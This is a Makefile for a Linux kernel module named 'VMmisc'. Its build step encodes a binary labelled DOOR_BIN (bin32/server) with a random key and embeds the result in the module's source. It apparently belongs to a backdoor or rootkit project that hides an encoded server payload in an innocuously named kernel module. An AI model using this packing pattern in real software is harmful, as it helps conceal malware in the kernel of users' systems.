EXTRA_CFLAGS	:= -g0 -ggdb0 -O2 -std=gnu89 -fno-stack-protector -Wno-unused-variable -Wno-unused-parameter -Wno-unused-function -Wno-unused-label 

# export CFLAGS := -std=gnu99 -Wall -Werror -pedantic
# ccflags-y := -DKRF_CODEGEN=1 -DLINUX -std=gnu99 -Wno-declaration-after-statement
# ccflags-y  += -I$(src)/include -Werror -fno-stack-protector -fomit-frame-pointer
_KERNEL_PATH := /lib/modules/$(shell uname -r)/build

PWD := $(shell pwd)
RAND2 = 0x$(shell cat /dev/urandom | head -c 4 | hexdump '-e"%x"')

KO_DIR ?= $(PWD)/kofile

ENCODE_SRC ?= $(PWD)/bin32/encode.c
ENCODE_ ?= $(PWD)/bin32/encode
DOOR_BIN ?= $(PWD)/bin32/server


NAME		:= VMmisc
obj-m			:= $(NAME).o
$(NAME)-y		:= kofile/main.o


all: pack_bin ko 
	
pack_bin:
	@ $(ENCODE_) $(DOOR_BIN) $(RAND2) > $(KO_DIR)/file_block.inc
	
ko:
	@ $(MAKE) -C $(_KERNEL_PATH) M=$(PWD) 



#$(ENCODE_): $(ENCODE_SRC)
#	@ echo "  CC      $(ENCODE_)"
#	@ $(CC) $(INCLUDE) -std=c99 $< -o $@
	
clean:
	rm -f *.ko *.o *.mod.o *.mod.c *.order *~  *.symvers


